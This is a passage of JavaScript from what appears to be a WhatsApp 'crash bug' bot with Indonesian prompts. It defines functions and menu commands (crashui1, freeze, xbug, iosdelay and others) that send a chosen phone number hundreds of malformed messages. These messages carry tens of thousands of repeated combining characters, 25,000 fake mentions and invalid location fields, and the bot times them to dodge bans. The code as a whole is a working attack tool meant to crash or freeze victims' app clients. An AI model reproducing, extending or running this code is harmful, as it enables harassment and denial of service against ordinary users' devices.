          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: fs2.readFileSync("./image/Senku.jpg"),
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "R҉e҉n҉ UI © RemSenku",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, p38 ? {
      participant: {
        jid: p37
      }
    } : {});
    console.log(chalk2.red(" *DONE SEND BUG JEDA 3-7 MENIT AGAR TIDAK TERKENA BAND* "));
  }
  ;
  p.sendButtonVideo = async (p39, p40, p41, p42 = {}) => {
    const v52 = {
      url: p42 && p42.video ? p42.video : ""
    };
    const v53 = {
      video: v52
    };
    const v54 = {
      upload: p.waUploadToServer
    };
    var v55 = await prepareWAMessageMedia(v53, v54);
    const v56 = {
      text: p42 && p42.body ? p42.body : ""
    };
    const v57 = {
      text: p42 && p42.footer ? p42.footer : ""
    };
    const v58 = {
      hasMediaAttachment: true,
      videoMessage: v55.videoMessage
    };
    const v59 = {
      buttons: p40,
      messageParamsJson: ""
    };
    const v60 = {
      quoted: p41
    };
    let vGenerateWAMessageFromContent5 = generateWAMessageFromContent(p39, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: v56,
            footer: v57,
            header: v58,
            nativeFlowMessage: v59,
            contextInfo: {
              externalAdReply: {
                title: global.namabot,
                body: "𝐅𝐨𝐫𝐠𝐞𝐫 𝐒𝐜𝐫𝐢𝐩𝐭",
                thumbnailUrl: "https://img100.pixhost.to/images/450/537926456_skyzopedia.jpg"
              }
            }
          }
        }
      }
    }, v60);
    await p.sendPresenceUpdate("composing", p39);
    return p.relayMessage(p39, vGenerateWAMessageFromContent5.message, {
      messageId: vGenerateWAMessageFromContent5.key.id
    });
  };
  async function f11(p43) {
    await p.relayMessage(p43, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0
              },
              hasMediaAttachment: true
            },
            body: {
              text: "R҉e҉n҉C҉r҉a҉s҉h҉        \u200A ꦾ" + "ꦾ".repeat(60000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({
                length: 5
              }, () => "1@newsletter"),
              groupMentions: [{
                groupJid: "1@newsletter",
                groupSubject: " Xintrashboy "
              }]
            }
          }
        }
      }
    }, {
      participant: {
        jid: p43
      }
    }, {
      messageId: null
    });
  }
  async function f12(p44, p45) {
    var vGenerateWAMessageFromContent6 = generateWAMessageFromContent(p44, proto.Message.fromObject({
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
        fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
        fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
        mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
        mimetype: "image/webp",
        directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
        fileLength: "10116",
        mediaKeyTimestamp: "1715876003",
        isAnimated: false,
        stickerSentTs: "1715881084144",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false
      }
    }), {
      userJid: p44,
      quoted: p45
    });
    await p.relayMessage(p44, vGenerateWAMessageFromContent6.message, {
      participant: {
        jid: p44
      },
      messageId: vGenerateWAMessageFromContent6.key.id
    });
  }
  async function f13(p46) {
    let v61 = "AntiGimik Ler";
    await p.relayMessage(p46, {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0
              },
              hasMediaAttachment: true
            },
            body: {
              text: "ꦾ" + "@𖤍RennSenku\u200Aꦾ".repeat(60000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({
                length: 5
              }, () => "1@newsletter"),
              groupMentions: [{
                groupJid: "1@newsletter",
                groupSubject: "D̸̢̮̫̰̥̗̘̱͉͙͙̺̫̏͒̅̌ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️â̸̙͐͑̌̿͛̽y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜y̷̧̰̲͍̝̘̗̩̑̇͐̾̽̏͊͑̇̃̉͜ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ŕ̶̛̰̱̈́̀́̑̿̾͛͂̈́͗̓̈́̒͘͝️ "
              }]
            }
          }
        }
      }
    }, {
      participant: {
        jid: p46
      }
    }, {
      messageId: null
    });
  }
  async function f14(p47) {
    var vGenerateWAMessageFromContent7 = generateWAMessageFromContent(p47, proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          liveLocationMessage: {
            degreesLatitude: "p",
            degreesLongitude: "p",
            caption: "ཱི𒅒𒈔𒅒𒇫𒄆ཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱིིིིིིིིིིིིིིི".repeat(50000),
            sequenceNumber: "0",
            jpegThumbnail: ""
          }
        }
      }
    }), {
      userJid: p47,
      quoted: v51
    });
    await p.relayMessage(p47, vGenerateWAMessageFromContent7.message, {
      participant: {
        jid: p47
      },
      messageId: vGenerateWAMessageFromContent7.key.id
    });
  }
  async function f15(p48) {
    var vGenerateWAMessageFromContent8 = generateWAMessageFromContent(p48, proto.Message.fromObject({
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
        fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
        fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
        mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
        mimetype: "image/webp",
        directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
        fileLength: "10116",
        mediaKeyTimestamp: "1715876003",
        isAnimated: false,
        stickerSentTs: "1715881084144",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false
      }
    }), {
      userJid: p48,
      quoted: v51
    });
    await p.relayMessage(p48, vGenerateWAMessageFromContent8.message, {
      participant: {
        Jid: p48
      },
      messageId: vGenerateWAMessageFromContent8.key.id
    });
  }
  switch (v7) {
    case "menu":
      {
        let v62 = "» ";
        let v63 = `
乂  ⌜ 𝑿𝑽𝒊𝒏𝒄𝒆𝒏𝒕 - 𝑨𝒅𝒗𝒂𝒏𝒄𝒆 ⌟  乂
❏ 𝚂𝚝𝚊𝚝𝚞𝚜 : *Premium*
❏ 𝚅𝚎𝚛𝚜𝚒𝚘𝚗 : *2.0*
❏ 𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚛 : *@𝚁𝚎𝚗𝚇𝚒𝚝𝚎𝚛*
⟣───────────────────
-ˏˋ 𝑩𝒖𝒈 𝑴𝒆𝒏𝒖 ˊˎ-
✼ crashui1 62xxx 
✼ freeze 62xxx 
✼ docx 62xxx done
✼ advancevx 62xxx
✼ blankv1 62xxx 
✼ combo-ui 62xxx
✼ xbug 62xxx 

-ˏˋ 𝑰𝒐𝒔𝑩𝒖𝒈 ˊˎ-
✼ iosdelay 62xxx 

-ˏˋ 𝑬𝒙𝒄𝒍𝒖𝒄𝒊𝒗𝒆𝑩𝒖𝒈 ˊˎ-
✼ lokasi 62xxx 
✼ hardui 62xxx 
✼ extrimeui 62xxx 
✼ hasilgpt 62xxx 
✼ combo1 62xxx 
✼ combo2 62xxx 
✼ combo3 62xxx 
✼ combofinal 62xx 

-ˏˋ 𝑩𝒆𝒕𝒂 𝑵𝒆𝒘ˊˎ-
✼ beta1 62xxx  
✼ beta2 62xxx 
> note : bug wa beta ini tahap uji coba

-ˏˋ 𝑶𝒘𝒏𝒆𝒓 𝑴𝒆𝒏𝒖 ˊˎ-
✼ addacces 
✼ delacces
✼ tourl

`.trim();
        f2("./image/Senku.jpg", v63);
      }
      break;
    case "combo-ui":
    case "blankv1":
    case "extrimeui":
    case "freeze":
    case "crashui1":
      {
        if (!v12) {
          return vF3("Fitur Khusus Premium!!");
        }
        if (!q) {
          return vF3("Gunakan Comand Berikut " + v7 + " 628xxx");
        }
        let v64 = q.replace(/[^0-9]/g, "");
        if (v64.startsWith("0")) {
          return vF3("Gunakan Awalan Nomor Negara Contoh : 62xxx");
        }
        let v65 = v64 + "@s.whatsapp.net";
        if (v65 === "6281911317205@s.whatsapp.net") {
          return vF3("GAGAL SALAH!!!!");
        }
        vF3("𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜ホ\n> 𝙅𝙚𝙙𝙖 𝟩 𝙈𝙚𝙣𝙞𝙩 𝘽𝙞𝙖𝙧 𝙂𝙖 𝙆𝙚𝙣𝙤𝙣‼️ ");
        for (let v66 = 0; v66 < 100; v66++) {
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝗞𝗶𝗹⃟" + "ꦾ".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net.")]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "*HITAM* " + "ꦾ̺".repeat(88888),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "G҈҈𝙑𝙞𝙣𝙘𝙚𝙣⃟" + "@6285929014979".repeat(90000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 800000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "HalG҈  L҈ I҈T҈H҈C҈V҉J҉k҉G̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆ByLaren̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆llo " + "ꦾ".repeat(40000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "CrasherJaktim" + "@62838G҈  L҈ I҈T҈H҈C҈V҉J҉k҉G̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺̺͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆͆66354557".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "𝙑𝙞𝙣𝙘𝙚𝙣𝙩 𝙑𝟤𓍯𓂃 🩸 " + "@6285929014979".repeat(80000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "𝙑𝟤𓍯𓂃" + "ꦾ𓍯𓂃".repeat(40000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "𝙑𝟤𓍯𓂃" + "@6285929014979".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net"]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await p.relayMessage(v65, {
            extendedTextMessage: {
              text: "C꙲r꙲a꙲𓍯𓂃" + "@6285929014979".repeat(50000),
              contextInfo: {
                mentionedJid: ["@6285929014979@s.whatsapp.net", ...Array.from({
                  length: 25000
                }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")]
              }
            }
          }, {
            participant: {
              jid: v65
            }
          });
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
          await f5(v65, Ptcp = true);
        }
      }
      break;
    case "docx":
    case "advancevx":
    case "xbug":
      {
        if (!v12) {
          return vF3("Fitur Khusus Premium!!");
        }
        if (!q) {
          return vF3("Gunakn Comand Berikut " + v7 + " 628xxx");
        }
        let v67 = q.replace(/[^0-9]/g, "");
        if (v67.startsWith("0")) {
          return vF3("Gunakan Nomor Dengan Kode Negara");
        }
        let v68 = v67 + "@s.whatsapp.net";
        if (v68 === "6281911317205@s.whatsapp.net") {
          return vF3("Target Salah!!");
        }
        vF3(" ```𝗛𝗜𝗧𝗔𝗠𝗞𝗔𝗡``` \nﾒ 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗕𝘂𝗴 : " + v7 + "\nﾒ 𝗧𝗮𝗿𝗴𝗲𝘁𝘀 : " + v68 + "\nﾒ 𝗜𝗡𝗙𝗢 : 𝗗𝗶𝗮 𝗦𝘂𝗱𝗮𝗵 𝗛𝗶𝘁𝗮𝗺!!!☠️");
        for (let v69 = 0; v69 < 300; v69++) {
          await f5(v68, Ptcp = true);
          await f5(v68, Ptcp = true);
